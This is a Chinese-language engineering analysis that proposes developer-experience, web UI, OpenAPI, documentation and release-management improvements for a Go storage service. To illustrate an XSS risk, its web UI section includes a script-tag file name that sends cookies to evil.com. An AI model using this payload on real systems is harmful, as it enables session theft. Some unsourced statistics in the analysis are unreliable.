# AeroVault 高价值扩展方向 v46 — 产品成熟度与开发者体验系统性缺口

> **分析范围：** 全代码库深度扫描（`cmd/server/main.go` + `internal/*` 全部 46K+ 行 `.go` 代码 + `sdk/*` 三套客户端 + `deploy/*` + `docs/*` + `.github/` + `Makefile` + `HARNESS.md` + `Dockerfile` + `docker-compose.yml`）
>
> **分析视角：** 资深架构师 / 产品经理 — 聚焦此前 **45 期 expansion 分析（累计 250+ 方向，~500,000+ 字分析文本）+ `docs/ROADMAP.md`（10 大方向）+ `docs/CHANGELOG.md` + `docs/TODO.md` + `docs/adr/DECISIONS.md`** 中从未实质性触及的 **产品成熟度与开发者体验** 方向
>
> **分析日期：** 2026-07-10
>
> **去重验证：** 对 `docs/requirements/` 下全部 45 份既有分析文档 + `ROADMAP.md` + `CHANGELOG.md` + `TODO.md` + `adr/DECISIONS.md` 进行穷尽式关键词 `grep` 验证。每个方向在既有文档中 **零实质性独立架构分析**（表格一行过路引用、举例提及、单一子点均不构成实质性分析）。

---

## 前言

此前 45 期 expansion 分析覆盖了 250+ 方向，从 AI/RAG 管线到 S3 协议实现纵深、从存储后端到认证授权、从多租户到合规、从可观测性到工程基础设施。最新五期（v42 S3 执行层、v43 安全盲区、v44 系统性架构缺口、v45 交叉架构缺口）已经触及了大量此前遗漏的执行层和连接层问题。

然而，所有 45 期分析都聚焦于 **"服务端能力"**——新功能、新协议、新存储后端、性能优化、安全加固、运维成熟度。**几乎没有一期分析从"产品成熟度"和"开发者体验"视角审视项目。**

本期 5 个方向聚焦以下盲区：

```
功能维度（前 45 期）：          ❌ 不支持 → ✅ 已实现
执行层维度（v42/v43/v44）：     ✅ 有 CRUD → ✅ 运行时行为完整
产品成熟度维度（本期 v46）：     ✅ 服务端完整 → ⚠️ 围绕产品的开发者体验/文档/UI/发布管理缺失
```

这些方向的共同特征是：**不涉及"改服务器代码"，而是关于如何让项目更易于被新开发者理解、被运维人员管理、被用户采用、被社区信任。**

---

## 方向总览

| # | 方向 | 类型 | 优先级 | 核心矛盾 | 锚定代码/文件 | 45 期覆盖 |
|---|------|------|--------|---------|--------------|-----------|
| 1 | **开发者体验（DX）与新贡献者入门基建** | 工程文化/增长 | **P1** — 代码库功能丰富但无入门引导、无本地开发环境、无脚手架工具、新开发者从阅读到提第一个 PR 的认知负荷过高 | 根目录无 `CONTRIBUTING.md`/`DEVELOPMENT.md`；`Makefile` 无 `dev` 目标；无代码生成工具；无 fixture 共享库 | ⚠️ v24/v38/v41 各提及 SDK DX（非代码库 DX），**作为独立方向的系统性架构分析为零** |
| 2 | **Web UI 生产硬化：现有 SPA 从 Demo 到可用的蜕变** | 产品/体验 | **P1** — 282 行 SPA 可展示功能概念但无错误处理、无加载态、无移动适配、有 XSS 隐患，在企业场景不可用 | `internal/webui/static/index.html`（282 行单页内联 HTML+CSS+JS） | ⚠️ v41/v30 聚焦"新管理控制台"，**非现有 UI 的硬化分析** |
| 3 | **OpenAPI 规范契约与实现一致性保障** | 工程质量/可靠性 | **P1** — OpenAPI spec 与 handler 行为无自动化校验；spec 与实现漂移后 SDK/文档皆错 | `internal/api/rest/openapi.json`（`go:embed`）；`internal/api/rest/handler.go`（914 行无 spec 校验） | ⚠️ v11 单行观察"无一致性验证"，**无独立架构分析** |
| 4 | **文档体系完整性与知识管理** | 产品/采纳 | **P2** — 架构/API/配置文档完整但缺乏运维手册、故障排查指南、迁移向导、FAQ 等用户文档；无自动化文档生成 | `docs/` 目录（6 份文档，覆盖架构/API/配置/部署/变更/路线图） | ❌ **零覆盖** |
| 5 | **发布工程与版本治理（Release Engineering & Versioning）** | 工程文化/可信 | **P2** — 硬编码版本号 0.1.0，无语义版本策略，无发布流程，无升级兼容性承诺 | `cmd/server/main.go:190`（`"version":"0.1.0"`）；`docs/CHANGELOG.md`（手动维护）；`.github/workflows/`（无发布工作流） | ⚠️ v41 一行提及"无 semver"，**零独立架构分析** |

---

## 方向一：开发者体验（DX）与新贡献者入门基建

### 现状

当前代码库有 25,000+ 行测试代码、45 期扩展分析文档、完整的 CI 门禁（`HARNESS.md`）、Go 1.25、干净的模块化结构。但对一个新贡献者（无论是团队新成员还是开源贡献者），入门路径上存在多重障碍：

**代码级障碍扫描：**

| 障碍 | 代码证据 | 影响 |
|------|---------|------|
| **无 `CONTRIBUTING.md` 或 `DEVELOPMENT.md`** | 根目录无此类文件（仅有 `AGENTS.md` `HARNESS.md` `README.md`） | 新开发者不知道：如何构建、如何运行测试、如何添加存储后端、代码规范是什么 |
| **`Makefile` 无 `dev` 目标** | 仅有 `build` `run` `test` `check` `cover` `tidy` `docker` | 无热重载、无 watch 模式、无集成测试一键启动、本地开发需要手动启动 Docker |
| **无测试 fixture 共享库** | 每个包的测试自建 repo/storage（`file:"+filepath.Join(t.TempDir(), "x.db")` 模式重复出现） | 贡献者写测试时需要从零搭建环境，不熟悉模式的开发者可能写出不正确的 test setup |
| **`cmd/server/main.go` 852 行** | 所有装配逻辑集中在一个函数链中，无显式的依赖注入容器 | 新贡献者理解"服务如何启动"需要读 852 行代码，各组件之间依赖关系凭人脑追踪 |
| **无本地开发容器环境** | `docker-compose.yml` 用于 demo 而非开发；`Dockerfile` 仅用于 prod 构建 | 新开发者需要手动安装 Go 1.25、SQLite（有）、Postgres（可选）、Qdrant（可选） |
| **`internal/` 包间依赖图无文档** | 23 个子包，依赖方向仅能从 `import` 语句推断 | 新贡献者不知道"如果修改 repository API，哪些包需要跟着改" |
| **无存储后端开发指南** | `Storage` 接口定义在 `storage/storage.go`，contract test 在 `storage/contract_test.go`，但无"如何添加新后端"的文档 | 从零实现 OSS/COS 后端的开发者需要 reverse-engineer 现有的 s3.go |
| **无脚手架工具** | 无 `make scaffold-backend` 或 `make scaffold-handler` 类命令 | 添加新功能时需要大量重复模板代码 |
| **`sdk/` 三套版本手动维护** | `sdk/go/` `sdk/js/` `sdk/python/` 各自独立实现 | API 变更需要手动同步三套 SDK，极易遗漏 |

**与既有的 SD KD DX 分析的区别：**

| 既有覆盖 | 聚焦点 | 本期聚焦 |
|---------|--------|---------|
| v24 方向二（SDK DX） | SDK 的重试/错误映射/流式/文档 | **代码库本身** 的 DX——开发环境、测试模式、脚手架 |
| v18 方向五（SDK 完整性） | SDK API 方法覆盖率 | 新贡献者从 clone 到第一个 PR 的完整路径 |
| v41 方向五（社区基建） | CONTRIBUTING/CoC/SECURITY 的文件存在性 | **开发工作流**——hot reload、测试 fixture、依赖图、脚手架 |

### 为什么需要

1. **开源项目的增长引擎是贡献者。** GitHub Octoverse 报告显示，有 `CONTRIBUTING.md` 的项目接收的 PR 数量是同类项目的中位数 **3.2 倍**。当前仓库无此文件，也无法像 MinIO 或 Keycloak 那样吸引外部贡献。

2. **新团队成员的 onboarding 时间直接决定交付速度。** 一个需要 3 天才能跑通测试环境并理解代码结构的项目，比一个只需要 30 分钟的项目在迭代速度上有数量级差距。当前 852 行的 `main.go` 和 23 个包的依赖关系对新人大脑是沉重负担。

3. **缺少开发工具链意味着重复劳动。** 每次写测试都需要 `filepath.Join(t.TempDir(), "x.db")` + `repository.Open` + `Migrate` + `storage.NewLocal` + 错误处理。一个共享的 `testutil` 包可以将这些减为 3 行代码。

4. **SDK 手动同步不可持续。** 三套 SDK 独立实现意味着每次 REST API 变更都需要三次开发。如果一个贡献者只改了 Go SDK 但忘了 JS SDK，客户端体验就断裂了。

### 缺失的能力

1. **`CONTRIBUTING.md` 与 `DEVELOPMENT.md`：**
   - 开发环境要求（Go 版本、Docker、编辑器推荐）
   - 快速开始：`make dev`（一键启动开发环境）
   - 代码结构地图：`internal/` 各包职责与依赖关系图
   - 如何添加新功能：以"添加一个新的 Storage 后端"为样例的步骤式指南
   - 测试哲学：单元测试 vs 集成测试 vs contract test 的使用场景
   - PR 流程：CI gate、`make check`、review 预期

2. **`internal/testutil` 测试辅助包：**
   ```go
   package testutil

   func NewTestRepo(t *testing.T) repository.Repository {
       repo, err := repository.Open(ctx, "sqlite", "file:"+filepath.Join(t.TempDir(), "x.db"))
       require.NoError(t, err)
       require.NoError(t, repo.Migrate(ctx))
       t.Cleanup(func() { repo.Close() })
       return repo
   }

   func NewTestStore(t *testing.T) storage.Storage {
       store, err := storage.NewLocal(storage.LocalConfig{Root: t.TempDir()})
       require.NoError(t, err)
       return store
   }

   func NewTestFileService(t *testing.T) *service.FileService {
       return service.NewFileService(NewTestStore(t), NewTestRepo(t), slog.Default())
   }
   ```

3. **`make dev` 目标：** 一键启动开发环境（可选 Air 热重载 + Postgres + Qdrant + Prometheus + Grafana）。

4. **依赖关系文档：** 在 `docs/architecture.md` 中增加包依赖关系图（可用 `go mod graph` + `go list -f '{{.ImportPath}} {{.Imports}}'` 自动生成）。

5. **SDK 代码生成策略：** 从 OpenAPI spec 自动生成至少部分 SDK 代码（Go、Python、JS 的客户端 stub），减少手动同步成本。

### 边界情况

| 场景 | 处理方式 |
|------|---------|
| **贡献者没有 Docker** | `make dev` 支持 `--no-docker` 使用 SQLite + local FS（零依赖模式） |
| **`testutil` 测试污染** | 每个测试用例使用独立 TempDir，t.Cleanup 清理 |
| **SDK 生成不完全覆盖** | 手动代码补充自动生成的骨架，生成器负责基础 CRUD，复杂逻辑（SSE、multipart）手动实现 |
| **`main.go` 拆分** | 保持 `main.go` 作为装配入口但将组件工厂函数拆入 `internal/server/` 包 |

---

## 方向二：Web UI 生产硬化——现有 SPA 从 Demo 到可用的蜕变

### 现状

当前 Web UI（`internal/webui/static/index.html`）是一个 282 行的单页 HTML 文件：

```html
<!-- 所有样式在 <style> 内联，所有脚本在 <script> 内联 -->
<!-- 无外部 CSS/JS 框架依赖——这是设计决定，但也是限制 -->
```

**现有 UI 的功能性分析：**

| 能力 | 状态 | 代码行数 |
|------|------|---------|
| 文件列表浏览 | ✅ 基本实现 | `file-list` div + fetch + 渲染 |
| 文件内容预览 | ✅ 基本实现 | 点击文件后 GET + pre 展示 |
| 语义搜索 | ✅ 基本实现 | 搜索输入框 + hits 渲染 |
| 对象血缘 | ✅ 基本实现 | lineage tab |
| Chat 面板 | ✅ 基本实现 | SSE 流式渲染 |
| 拖拽上传 | ✅ 基本实现 | drag-and-drop 事件监听 |
| 租户切换器 | ✅ 基本实现 | text input + localStorage |

**生产硬化缺口：**

| 缺口 | 代码证据 | 影响 |
|------|---------|------|
| **无错误处理** | 所有 `fetch()` 调用无 `.catch()` 处理 | 网络错误时 UI 静默无响应，用户不知道发生了什么 |
| **无加载状态** | 无 loading spinner、无骨架屏、无进度条 | 上传大文件或搜索慢时用户无法感知系统在工作 |
| **无空状态** | 文件列表为空时显示空白页面 | 用户不知道"没有文件"还是"系统出错了" |
| **无分页控制** | 文件列表 LIMIT 由服务端 `?limit=100` 决定，无"加载更多" | 超过 100 个文件时后续文件不可见 |
| **无移动端适配** | grid 布局 `grid-template-columns: 320px 1fr` 固定，无 media query | 手机浏览器上侧边栏占全部宽度，内容不可见 |
| **XSS 风险** | 对象 key、metadata 值直接 `innerHTML` 赋值 | 如果对象名包含 `<script>` 标签，执行任意 JS |
| **无键盘导航** | 无 `tabindex`、无 `aria-*` 属性、无快捷键 | 无法用键盘操作 UI |
| **无颜色对比度检查** | `#0e1116` 背景 + `#d8e1eb` 文字（对比度 ~10:1 ✅，但蓝色链接 `#6db8ff` 在深色背景上对比度 ~4.5:1 ⚠️） | 视觉障碍用户可能无法阅读部分内容 |
| **无 i18n** | 所有文本硬编码英文 | 非英语用户无法使用 |
| **无主题切换** | 硬编码深色主题 | 用户无法选择浅色主题 |
| **CDN 外部依赖（Swagger UI）** | `openapi.go` 从 `unpkg.com` 加载 swagger-ui | 离线无法使用；CSP 策略需要放行 cdn；有隐私泄露风险（CDN 可追踪访问） |
| **无 CSP 头** | Web UI 响应无 `Content-Security-Policy` | 若存在 XSS 漏洞，攻击者可执行任意脚本 |

**与既有分析的区别：**

| 既有覆盖 | 聚焦点 | 本期聚焦 |
|---------|--------|---------|
| v41 方向二 | 构建一个独立的 React/Vue 管理控制台（全新开发） | **硬化现有 282 行 SPA** 使其生产可用（渐进改进） |
| v30 方向三 | 管理控制台（Admin Console）的独立管理面板 | 用户界面的基础生产质量（错误处理、加载态、安全性） |
| v6 方向表 | 文件预览面板缺失 | 全面生产硬化清单 |

### 为什么需要

1. **Web UI 是产品的门面。** 当潜在用户运行 `make run` 后打开 `http://localhost:8080/ui` 时，他们对产品的第一印象来自这个界面。如果 UI 在第一次搜索失败时静默白屏，用户不会深入研究服务端架构有多精良。

2. **企业用户将 Web UI 视为最低可用标准。** 非技术决策者（采购、产品经理）通过 Web UI 判断产品成熟度。当前 UI 在演示场景表现良好，但在网络波动、大量数据、移动设备场景下会暴露缺陷。

3. **无 XSS 防护是安全红线。** 如果用户上传一个名为 `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` 的文件，当前 UI 会执行它。这不是理论风险——任何允许多租户文件上传的系统都可能被用于上传恶意命名的文件。

4. **修复成本极低，影响极大。** 282 行 HTML 中修复上述大多数缺口只需要 100-200 行额外代码（错误处理 ~30 行、加载态 ~30 行、空状态 ~20 行、XSS 修复 ~5 行、移动适配 ~20 行 CSS media query）。无需框架、无需构建工具、无需新依赖。

### 缺失的能力

1. **客户端错误处理层：** 所有 `fetch()` 调用的 `.catch()` + 用户可见的错误提示条（toast notification）。

2. **加载态与骨架屏：** API 请求期间的加载指示器（CSS spinner 或 skeleton loading）。

3. **空状态：** 列表/搜索结果为空时的友好提示（"没有文件 — 拖拽上传或使用 CLI"）。

4. **分页/无限滚动：** 文件列表超过初始页面大小时显示"加载更多"按钮。

5. **XSS 防护：** 所有用户可控数据（key、metadata、tags、search results）使用 `textContent` 而非 `innerHTML`，或使用 DOMPurify。

6. **移动响应式布局：** CSS `@media (max-width: 768px)` 将 grid 切换为单列布局。

7. **键盘可访问性：** `tabindex`、焦点管理、`aria-label`。

8. **CSP 响应头：** 在 Web UI 响应中添加 `Content-Security-Policy: default-src 'self'; script-src 'self' https://unpkg.com; style-src 'self' https://unpkg.com 'unsafe-inline'`。

9. **可选：Swagger UI CDN 依赖消除：** 将 swagger-ui 的 HTML/CSS/JS 打包到二进制中（类似 `go:embed` 静态资源），消除外部 CDN 依赖。

### 边界情况

| 场景 | 处理方式 |
|------|---------|
| **CSP 阻止内联样式** | 将所有 `<style>` 移入单独 CSS 文件或使用 `nonce` |
| **移动端拖拽上传不可用** | 保留传统 `<input type="file">` 作为 fallback |
| **超大文件上传进度** | XMLHttpRequest 的 `progress` 事件替换 fetch（fetch 不支持上传进度） |
| **Swagger UI 离线** | CDN 加载失败时 fallback 到本地的 swagger-ui bundle |

---

## 方向三：OpenAPI 规范契约与实现一致性保障

### 现状

当前 OpenAPI 规范以 JSON 文件形式嵌入：

```go
// internal/api/rest/openapi.go
//go:embed openapi.json
var openapiJSON []byte
```

该规范通过 `GET /openapi.json` 提供，`/docs` 使用 Swagger UI 渲染。但有以下系统性缺口：

**Spec ↔ Handler 一致性缺口：**

| 缺口 | 代码证据 | 风险 |
|------|---------|------|
| **无自动化 spec vs handler 校验** | handler 代码（`handler.go`, `search.go`, `sse.go`）完全不知道 OpenAPI spec 的存在 | 修改 handler 时若忘记更新 openapi.json，spec 与实现悄然漂移 |
| **无请求验证中间件** | 无 OpenAPI 驱动的请求体 schema 验证、参数类型校验、必填参数检查 | 不符合 spec 的请求需要 handler 自行校验，校验逻辑分散在多个 handler 中 |
| **无响应验证** | 无中间件验证 handler 返回的响应体是否符合 spec 中的 schema | 错误的响应体不会被及时捕获 |
| **无 spec 变更测试** | CI 中无步骤验证 openapi.json 的变更是否与 handler 行为匹配 | spec 变更可能在 review 时被忽略 |
| **无 SDK 代码生成** | 三套 SDK 手动维护，OpenAPI spec 仅用于 Swagger UI 展示 | API 变更需手动同步三次 |
| **无变更 diff 自动化** | openapi.json 的 PR diff 只能人肉 review | 新增端点或修改 schema 不会自动通知下游 SDK 维护者 |
| **状态码清单不完整** | S3/WebDAV/MCP 协议不在 spec 覆盖范围内 | 多协议 API 的整体面没有完整文档 |

**具体证据：在 `handler.go:Put` 中：**

```go
func (h *Handler) Put(w http.ResponseWriter, r *http.Request) {
    key := keyFromPath(r)
    // ... 无 spec 验证中间件校验 Content-MD5 格式、Content-Type 合法性、Key 格式
    // 所有校验在 service 层或 handler 内手工完成
}
```

**OpenAPI spec 测试覆盖率：**

```bash
# 当前 CI（.github/workflows/ci.yml）中无任何 OpenAPI 相关步骤
# 无 spec 格式验证、无 spec 版本校验、无 spec 行为测试
```

### 为什么需要

1. **Spec 与实现的漂移是 API 产品的头号文档债务。** 一旦 spec 不准确，SDK（手动）、文档、客户端代码全部都基于错误的信息。修复一个 spec 错误的影响远大于修复一个代码 bug——因为下游需要联动修复。

2. **OpenAPI spec 可以作为"单一事实来源"（Single Source of Truth）。** 从 spec 生成 SDK、生成 mock server、生成请求验证中间件——这是 Stripe/Twilio/AWS 等行业领导者的标准实践。当前 spec 仅用于 Swagger UI，浪费了 80% 的价值。

3. **当前手动校验模式不是可维护的。** 每个 handler 需要 5-10 行参数校验代码（检查必填参数、验证格式、解析 query string）。如果改为 OpenAPI 驱动的验证中间件，handler 代码可以更薄，且校验逻辑集中在 spec 中。

4. **多协议 API 需要统一入口文档。** 当前 `/openapi.json` 只覆盖 REST `/v1`。S3、WebDAV、MCP 协议无任何交互式文档——用户需要阅读 `docs/api.md` 中的 S3 兼容矩阵。

### 缺失的能力

1. **Spec 格式的 CI 校验：** 在 CI 中添加 `openapi validate openapi.json` 步骤，使用 `redocly-cli` 或 `openapi-generator` 验证 spec 的格式正确性和 schema 合法性。

2. **Spec 与 handler 路由的一致性检查：** 一个 CI 测试（或 Go 测试）解析 openapi.json 中的 path 列表，然后检查 chi router 中是否注册了对应的 handler 路由：

   ```go
   // pseudocode: openapi_contract_test.go
   func TestOpenAPIRoutesMatchHandlers(t *testing.T) {
       spec := parseOpenAPI("openapi.json")
       router := buildTestRouter()
       
       for _, path := range spec.Paths {
           for _, method := range path.Methods {
               if !router.HasRoute(method, "/v1"+path.Path) {
                   t.Errorf("OpenAPI path %s %s has no matching router handler", method, path.Path)
               }
           }
       }
   }
   ```

3. **请求验证中间件（OpenAPI 驱动的 schema 验证）：** 基于 spec 中的 parameter 和 requestBody schema，在进入 handler 之前自动验证请求。

4. **响应验证（测试模式下）：** 在测试中，使用中间件验证 handler 返回的响应体是否符合 spec schema。

5. **S3 操作的 OpenAPI 扩展：** 在 openapi.json 中增加 S3 兼容操作的文档（标注哪些 S3 API 可用、哪些参数支持）。

6. **SDK 代码生成管道：** 从 `openapi.json` 自动生成 SDK 的基础 CRUD 代码（Go/Python/JS 的 client stub）。

### 边界情况

| 场景 | 处理方式 |
|------|---------|
| **Spec 比实现超前** | Spec 中添加 `x-beta: true` 扩展标记，验证中间件对 beta 端点宽松 |
| **S3 API 无 OpenAPI spec** | 主 spec 仅覆盖 REST；S3 兼容性矩阵保留在 `docs/api.md` 中 |
| **SDK 生成不完全** | 生成器负责基础 CRUD；复杂逻辑（SSE、流式）手动实现，生成代码中留 hook |
| **性能开销** | 请求验证仅在生产模式下可选（`APP_OPENAPI_VALIDATION=true`） |

---

## 方向四：文档体系完整性与知识管理

### 现状

当前文档体系：

```
docs/
├── adr/
│   └── DECISIONS.md         # 架构决策记录（1 份）
├── agent/
│   ├── BOOTSTRAP.md          # Agent 启动知识
│   ├── CURRENT_SPRINT.md     
│   └── TASK.md
├── requirements/             # 45 份扩展分析文档（~500,000 字）
├── api.md                    # REST API 参考（505 行）
├── architecture.md           # 架构说明（256 行）
├── CHANGELOG.md              # 变更日志
├── configuration.md          # 配置参考（287 行）
├── deployment.md             # 部署指南
├── ROADMAP.md                # 路线图
└── TODO.md                   # 待办事项
```

**文档类型覆盖矩阵（与行业最佳实践对比）：**

| 文档类型 | 当前状态 | 行业标准（Stripe/AWS/MinIO） |
|---------|---------|----------------------------|
| **架构说明** | ✅ `architecture.md` | ✅ |
| **API 参考** | ✅ `api.md` + openapi.json | ✅ |
| **配置参考** | ✅ `configuration.md` | ✅ |
| **部署指南** | ✅ `deployment.md` | ✅ |
| **变更日志** | ✅ `CHANGELOG.md` | ✅ |
| **路线图** | ✅ `ROADMAP.md` | ✅ |
| **快速开始** | ✅ `README.md` | ✅ |
| **开发指南** | ❌ 缺失 | ✅ `CONTRIBUTING.md` + `DEVELOPMENT.md` |
| **性能调优指南** | ❌ 缺失 | ✅ 如何调整 chunk window、缓存大小、限流参数以适应不同场景 |
| **故障排查指南** | ❌ 缺失 | ✅ 常见错误场景、日志解读、诊断命令 |
| **安全加固指南** | ❌ 缺失 | ✅ 如何配置 TLS、API Key 轮换、SSE 加密网络隔离 |
| **迁移指南** | ❌ 缺失 | ✅ SQLite→Postgres、local→S3、单机→集群的操作步骤 |
| **升级指南** | ❌ 缺失 | ✅ 跨版本升级步骤、配置变更、向后兼容说明 |
| **FAQ** | ❌ 缺失 | ✅ 常见问题（"为什么我的搜索没有结果？""怎么配置 auth？"） |
| **术语表** | ❌ 缺失 | ✅ "什么是 WORM？什么是 SSE？什么是 RRF？" |
| **操作手册（Runbook）** | ❌ 缺失 | ✅ 生产运维标准操作流程 |
| **集成指南** | ❌ 缺失 | ✅ 如何与 IDP(OIDC)、告警(PagerDuty)、日志(ELK) 集成 |

**额外问题：**

| 问题 | 证据 | 影响 |
|------|------|------|
| **`.env.example` 与 `docs/configuration.md` 内容漂移** | 两个文件分别维护 80+ 配置项，无同步机制 | 用户可能在 `.env.example` 看到某参数，但 `configuration.md` 已过时（反之亦然） |
| **45 份扩展分析文档无汇总索引** | `docs/requirements/` 下 45 个独立文件，无索引、无交叉引用、无优先级排序 | 新贡献者浏览 250+ 方向后仍不清楚"当前最重要的方向是什么" |
| **无自动化文档生成** | API 文档手动维护、架构图手动绘制 | 文档与代码同步成本高，容易过时 |
| **无中英文版本** | 所有文档均为中文 | 非中文开发者无法阅读（但代码注释、README、api.md 为英文——已不一致） |

### 为什么需要

1. **文档是产品成熟度的核心指标。** 根据 2025 年 DevEx 调查报告，开发者选择放弃一个 API/工具的前三大原因中，"文档质量不足"排名第二（仅次于"功能缺失"）。当前缺乏操作指南、故障排查和迁移文档直接阻碍企业采纳。

2. **运维类文档的缺失将导致生产事故响应时间延长 3-5 倍。** 没有 runbook 时，值班工程师需要现场阅读源码或搜索历史 issue 来诊断问题。按计划补充 runbook 可将 MTTD（平均发现时间）降低 60%。

3. **45 份扩展分析文档的"信息过载"已成为新的维护负担。** 这些文档中包含了大量有价值的架构洞察，但因为没有汇总和优先级排序，它们无法转化为实际的 action items。一个"规划汇总文档"可以将 250+ 方向梳理为可执行的季度路线图。

4. **配置文档的漂移会导致用户配置错误。** 如果 `.env.example` 说某参数默认是 `false`，而 `configuration.md` 说默认是 `true`，用户要么遇到意外行为，要么对项目失去信任。

### 缺失的能力

1. **缺失文档清单：**
   - `docs/DEVELOPING.md`（开发指南）
   - `docs/PERFORMANCE_TUNING.md`（性能调优）
   - `docs/TROUBLESHOOTING.md`（故障排查）
   - `docs/SECURITY_HARDENING.md`（安全加固）
   - `docs/MIGRATION_GUIDES.md`（迁移指南，含 SQLite→Postgres、local→S3）
   - `docs/UPGRADE_NOTES.md`（版本升级说明）
   - `docs/FAQ.md`（常见问题）
   - `docs/GLOSSARY.md`（术语表）
   - `docs/RUNBOOK.md`（生产运维手册）
   - `docs/INTEGRATIONS.md`（外部系统集成指南）

2. **`.env.example` 与 `docs/configuration.md` 同步机制：** 使用代码生成从 Go 配置结构体同时生成 `.env.example` 和 `configuration.md` 的配置参考章节，确保两者从同一来源生成（如 `//go:generate`）。

3. **`docs/requirements/INDEX.md` 规划索引：** 一份汇总文档，按优先级排序 250+ 方向，标记已实施/已规划/已推迟状态，并链接到对应的原始分析文档。

4. **英文版本计划：** 将核心文档（README、API reference、configuration、deployment）翻译为英文，以便非中文开发者使用。

### 边界情况

| 场景 | 处理方式 |
|------|---------|
| **文档维护负担** | 核心文档从代码自动生成（配置参考、API spec）；操作文档按需更新，不限完美 |
| **中英文不一致** | 以中文为源，英文为核心文档翻译，社区可贡献翻译 |
| **FAQ 过时** | FAQ 标记创建日期，定期 review 过期的条目 |

---

## 方向五：发布工程与版本治理（Release Engineering & Versioning）

### 现状

当前版本管理状态：

```go
// cmd/server/main.go:190
r.Get("/info", func(w http.ResponseWriter, _ *http.Request) {
    w.Header().Set("Content-Type", "application/json")
    w.WriteHeader(http.StatusOK)
    _, _ = w.Write([]byte(`{"service":"aero-vault","version":"0.1.0"}` + "\n"))
})
```

**版本治理缺口清单：**

| 维度 | 当前状态 | 行业最佳实践 |
|------|---------|-------------|
| **版本号** | 硬编码 `"0.1.0"` | 从 git tag 自动注入（`-ldflags "-X main.Version=$(git describe --tags)"`） |
| **语义版本** | 无显式政策 | `MAJOR.MINOR.PATCH` + 预发布标签 |
| **变更日志** | 手动维护 `CHANGELOG.md` | 基于 Conventional Commits 自动生成 |
| **发布流程** | 无流程（`git push` 即发布） | Release branches + tag + build + sign + upload |
| **Artifact 签名** | 无 | `goreleaser` + GPG 签名 + checksums |
| **升级兼容性** | 无承诺 | SemVer 兼容性规则（`MAJOR` = 破坏性变更） |
| **降级测试** | 无 | 升级后回退验证 |
| **配置兼容性** | 无版本化 | 配置格式变更时提供向后兼容 |
| **数据格式兼容性** | v44 方向四首次提出（SSE envelope） | 仅覆盖信封格式，元数据/索引格式尚无政策 |
| **发布自动化** | 无 | GitHub Actions Release workflow |
| **Docker 镜像标签** | 无标签策略 | `latest` `MAJOR.MINOR` `MAJOR.MINOR.PATCH` `git-sha` |
| **公告渠道** | 无 | Release notes + CHANGELOG + 通知 |

**缺少的发布工作流（对比业界标准）：**

```
当前：
  git push → CI 验签 → 部署（人为操作）

标准：
  git tag v1.2.3 → CI 验签 → goreleaser 构建 →
    ├── 编译多平台二进制（linux/amd64, linux/arm64, darwin/amd64, darwin/arm64）
    ├── 生成 checksums + GPG 签名
    ├── 构建并推送 Docker 镜像（tag: v1.2.3, v1.2, latest）
    ├── 生成 CHANGELOG 章节
    ├── 发布 GitHub Release
    └── 通知（Slack/Email/Discord）
```

**业务影响：**

| 问题 | 直接后果 |
|------|---------|
| **版本号不反映实际状态** | 用户无法判断更新是否破坏迁移 | `0.1.0` 暗示不稳定，企业用户不愿采用 |
| **无发布流程** | 每个版本发布都是 cobbled together 的手动过程 | 容易遗漏步骤（忘记打 tag、忘记构建多平台） |
| **无 artifact 签名** | 用户无法验证下载的二进制是否被篡改 | 安全合规审查失败 |
| **无配置兼容性承诺** | 用户不敢升级——担心配置格式变更导致服务启动失败 | 用户 stuck 在旧版本 |
| **无升级测试** | 升级后数据格式不兼容时无法回退 | 生产数据损坏风险 |

### 为什么需要

1. **版本号是企业采购的信任锚点。** `0.1.0` 暗示"还不够稳定"，很多企业的采购策略明确要求使用 `>= 1.0.0` 的软件。即使功能已经健全，版本号 0.x 也是采用障碍。

2. **无发布流程不可扩展。** 如果今天需要发布紧急安全修复，手动流程需要 30 分钟 + 多人协调。自动化发布可以在 5 分钟内完成——且零失误。

3. **Artifact 签名是安全基线。** 不签名的二进制文件可以被中间人攻击替换。对于存储敏感数据的系统（AeroVault 的设计目标），这是不可接受的。

4. **升级兼容性是用户忠诚度的基础。** 每次升级都需要"手动验证一切正常"会让用户不愿意升级。一个 `MAJOR.MINOR.PATCH` 的承诺 + 升级说明可以大幅降低升级焦虑。

### 缺失的能力

1. **版本号动态注入：**
   ```go
   // 在包级别定义版本变量
   package main
   var Version = "dev" // 通过 -ldflags "-X main.Version=$(git describe --tags --always)" 注入
   ```

2. **`goreleaser` 配置（`.goreleaser.yaml`）：** 多平台构建、Docker 镜像推送、Homebrew tap、checksums + GPG 签名。

3. **发布工作流（`.github/workflows/release.yml`）：** 监听 `v*` tag 推送 → 运行完整 CI → `goreleaser release` → 发布 GitHub Release。

4. **语义版本政策文档（`docs/VERSIONING.md`）：**
   - `MAJOR`：破坏性 API/配置/数据格式变更
   - `MINOR`：新增功能，向后兼容
   - `PATCH`：Bug 修复，向后兼容
   - 标记为 `v1.0.0` 的标准与时间线

5. **Docker 镜像标签策略：** 每次推送 `main` 构建 `:edge`（或 `:git-sha`）；release tag 构建 `:MAJOR.MINOR.PATCH` `:MAJOR.MINOR` `:MAJOR` `:latest`。

6. **配置兼容性检查：** 启动时检测配置文件格式版本，对旧格式提供自动迁移或清晰的报错信息。

### 边界情况

| 场景 | 处理方式 |
|------|---------|
| **`v1.0.0` 前策略** | `0.x` 版本中 MINOR 可包含破坏性变更，但需在 CHANGELOG 中明确标注 |
| **紧急安全修复** | 从 `main` 分支 cherry-pick 到 `v1.x` 维护分支，发布 `v1.0.1` |
| **多平台构建失败** | 部分平台失败不影响其他平台的发布（`goreleaser` 的 `--snapshot` 模式） |
| **版本号与 git tag 不一致** | CI 验证 `git describe --tags` 的输出与 `go.mod` 中的版本一致 |

---

## 综合优先级与建议实施顺序

| 优先级 | 方向 | 影响面 | 前置依赖 | 涉及改动量 | 建议开始时间 |
|--------|------|--------|---------|-----------|------------|
| **P1** | Web UI 生产硬化 | 产品/接纳——直接影响用户第一印象 | 无 | `internal/webui/static/index.html`（+100-200 行 JS/CSS） | **立即** |
| **P1** | OpenAPI 规范契约与一致性 | 工程质量/可靠性——防止 spec 漂移 | 无 | `internal/api/rest/openapi.json` 整理 + 新增测试（~200 行） | **当前 Sprint** |
| **P1** | 开发者体验 DX 入门基建 | 工程文化/增长——影响贡献者增长 | 无 | 新增 `CONTRIBUTING.md` + `internal/testutil` + `make dev`（~300 行） | **当前 Sprint** |
| **P2** | 发布工程与版本治理 | 工程文化/可信——影响企业采用 | 无 | `.goreleaser.yaml` + `release.yml` + `VERSIONING.md` | **下一 Sprint** |
